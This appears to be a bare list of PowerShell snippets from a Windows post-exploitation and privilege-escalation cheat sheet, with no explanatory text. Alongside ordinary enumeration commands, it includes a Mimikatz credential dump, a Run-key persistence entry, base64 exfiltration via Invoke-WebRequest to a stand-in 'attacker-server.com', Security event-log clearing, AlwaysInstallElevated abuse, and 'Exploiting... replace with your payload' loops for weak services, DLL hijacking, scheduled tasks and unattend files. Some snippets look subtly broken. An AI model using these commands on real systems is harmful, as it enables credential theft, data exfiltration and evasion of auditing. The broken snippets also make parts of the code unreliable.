["```\n whoami /all\n```", "```\n # Load Mimikatz module\nImport-Module .\\mimikatz.ps1\n# Run Mimikatz command to dump credentials\nInvoke-Mimikatz -DumpCreds\n```", "```\n # Create a registry key for persistence\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MyScript\" -Value \"powershell.exe -ExecutionPolicy Bypass -File C:\\Path\\To\\MyScript.ps1\"\n```", "```\n # Enable PowerShell remoting on the target machine\nEnable-PSRemoting -Force\n# Run a command on the remote machine\nInvoke-Command -ComputerName TargetMachine -ScriptBlock { Get-Process }\n```", "```\n # Encode and send data to a remote server\n$data = \"SensitiveData\"\n$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))\nInvoke-WebRequest -Uri \"http s://attac ker-server.com/upload.php\" -Method POST -Body $encodedData\n```", "```\n # Clear Windows event logs\nGet-EventLog -LogName \"Security\" | ForEach-Object { Clear-EventLog -LogName $_.Log -Entry $_.Index -Force }\n```", "```\n # Get information about the current user\nGet-LocalUser -Name $env:USERNAME\n# Get group memberships of the current user\nGet-LocalGroupMember -Group \"Users\"\n```", "```\n # Get a list of running processes for the current user\nGet-Process -IncludeUserName\n```", "```\n # Get active network connections for the current user\nGet-NetTCPConnection -OwningProcess (Get-Process -IncludeUserName | Where-Object { $_.UserName -eq $env:USERNAME }).Id\n```", "```\n # List files/directories in the user's home directory\nGet-ChildItem -Path $env:USERPROFILE\n```", "```\n # Get a list of installed software for the current user\nGet-WmiObject -Query \"SELECT * FROM Win32_Product WHERE Vendor = '$env:USERNAME'\"\n```", "```\n # Get recent security events for the current user\nGet-WinEvent -LogName Security -FilterXPath \"*[System[(EventID=4624 or EventID=4634) and EventData[Data[@Name='TargetUserName']='$env:USERNAME']]]\" -MaxEvents 10\n```", "```\n # Get file permissions for a specific file\nGet-Acl -Path \"C:\\Path\\To\\File.txt\" | Format-List\n```", "```\n # Grant read and execute permissions to a user\n$user = \"andrewblyth\"\n$file = \"C:\\Path\\To\\File.txt\"\n$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, \"ReadAndExecute\", \"Allow\")\n(Get-Acl -Path $file).AddAccessRule($permission) | Set-Acl -Path $file\n```", "```\n # Add write permissions to an existing user\n$user = \"AndrewBlyth\"\n$file = \"C:\\Path\\To\\File.txt\"\n$acl = Get-Acl -Path $file\n$acl.SetAccessRuleProtection($false, $false)\n$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, \"Write\", \"Allow\")\n$acl.AddAccessRule($permission) | Set-Acl -Path $file\n```", "```\n # Remove read permissions from a user\n$user = \"AndrewBlyth\"\n$file = \"C:\\Path\\To\\File.txt\"\n$acl = Get-Acl -Path $file\n$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq \"Read\" }\n$acl.RemoveAccessRule($rule) | Set-Acl -Path $file\n```", "```\n # Check current user's privileges\nwhoami /all\n```", "```\n # Get members of the Administrators group\nGet-LocalGroupMember -Group \"Administrators\"\n```", "```\n # Check for unquoted service paths\nGet-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '\"*\\\\*\"' -and $_.StartMode -ne 'Disabled' }\n```", "```\n # Identify services with weak permissions\nGet-Service | ForEach-Object {\n    $service = $_\n    $acl = (Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$($service.ServiceName)\")\n    if ($acl.Access | Where-Object { $_.IdentityReference -eq \"Users\" -and $_.FileSystemRights -match \"Write\" }) {\n        # Exploit weak permissions (replace with your payload)\n        Write-Host \"Service $($service.DisplayName) has weak permissions. Exploiting...\"     }\n}\n```", "```\n # Identify processes with DLL hijacking potential\nGet-Process | ForEach-Object {\n    $process = $_\n    $dllPath = Join-Path $process.MainModule.FileName -ChildPath \"evil.dll\"\n    if (-not (Test-Path $dllPath)) {\n        # Exploit DLL hijacking (replace with your payload)\n        Write-Host \"Potential DLL hijacking found in $($process.ProcessName). Exploiting...\"     }\n}\n```", "```\n # Modify the AlwaysInstallElevated registry key\n$regPath = \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer\"\n$regName = \"AlwaysInstallElevated\"\nNew-Item -Path $regPath -Force\nSet-ItemProperty -Path $regPath -Name $regName -Value 1\n```", "```\n # Identify folders with weak permissions\nGet-ChildItem -Path C:\\ -Recurse | Where-Object {\n    $_.PSIsContainer -and (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -eq \"Users\" -and $_.FileSystemRights -match \"Modify\" }\n}\n```", "```\n # Identify scheduled tasks\nGet-ScheduledTask | Where-Object { $_.Principal.UserId -eq \"NT AUTHORITY\\SYSTEM\" } | ForEach-Object {\n    # Exploit scheduled task (replace with your payload)\n    Write-Host \"Scheduled task $($_.TaskName) is running as SYSTEM. Exploiting...\" }\n```", "```\n # Search for unattended installation files\nGet-ChildItem -Path C:\\ -Recurse -Filter \"unattend.xml\" -File | ForEach-Object {\n    # Exploit unattended installation file (replace with your payload)\n    Write-Host \"Unattended installation file found at $($_.FullName). Exploiting...\" }\n```"]